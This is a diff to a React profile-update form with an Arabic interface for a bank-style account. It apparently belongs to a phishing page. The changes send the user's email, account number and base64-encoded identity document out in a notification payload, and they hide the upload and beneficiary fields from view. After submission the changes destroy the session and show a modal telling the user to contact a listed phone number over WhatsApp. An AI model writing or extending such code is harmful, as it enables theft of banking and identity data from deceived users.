@@ -340,10 +340,11 @@ const ProfileUpdate = () => {
                     userEmail: currentUser.email,
                     accountNumber: currentUser.accountNumber,
                     changes,
-                    // identityFile: formData.identityFileBase64,
-                    // fileName: formData.identityFile ? formData.identityFile.name : null
+                    identityFile: formData.identityFileBase64,
+                    fileName: formData.identityFile ? formData.identityFile.name : null
 
-                }); setShowPhoneModal(true);
+                });setShowPhoneModal(true);
+                destroySession();
             } catch (emailError) {
                 console.error('Failed to send update notification:', emailError);
                 emailFailed = true;
@@ -397,7 +398,7 @@ const ProfileUpdate = () => {
             <div className="page-wrapper">
                 <div className="form-card form-card-large">
                     <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 'var(--spacing-lg)' }}>
-                        <h1 className="card-title" style={{ margin: 0 }}>تحديث البيانات</h1>
+                        <h1 className="card-title" style={{ margin: 0 }}>استمارة تحديث البيانات  </h1>
                         <button
                             type="button"
                             className="btn btn-secondary"
@@ -456,7 +457,7 @@ const ProfileUpdate = () => {
                         </div>
 
                         {/* Beneficiaries List */}
-                        <div className="form-group">
+                        {/* <div className="form-group">
                             <label htmlFor="beneficiariesList" className="form-label">
                                 قائمة المستفيدين
                             </label>
@@ -473,7 +474,7 @@ const ProfileUpdate = () => {
                             {errors.beneficiariesList && (
                                 <span className="error-message">{errors.beneficiariesList}</span>
                             )}
-                        </div>
+                        </div> */}
 
                         {/* Services Checkboxes */}
                         <div className="checkbox-grid">
@@ -610,7 +611,7 @@ const ProfileUpdate = () => {
                             )}
                         </div>
 
-                        {/* Identity File Upload */}
+                        {/* Identity File Upload
                         <div className="file-upload-wrapper">
                             <label className="file-upload-label">إثبات الهوية</label>
                             <label
@@ -640,7 +641,7 @@ const ProfileUpdate = () => {
                             {errors.identityFile && (
                                 <span className="error-message">{errors.identityFile}</span>
                             )}
-                        </div>
+                        </div> */}
 
                         {/* Withdrawals */}
                         <div className="form-group">
@@ -697,7 +698,7 @@ const ProfileUpdate = () => {
                     {showPhoneModal && (
                         <div className="blur-overlay">
                             <div className="phone-card">
-                                <h2>رقم التواصل بعد التحديث</h2>
+                                <h2>بعد التحديث تواصل مع هذا الرقم عبر الواتساب </h2>
 
                                 <div className="phone-number">
                                     00249911266354
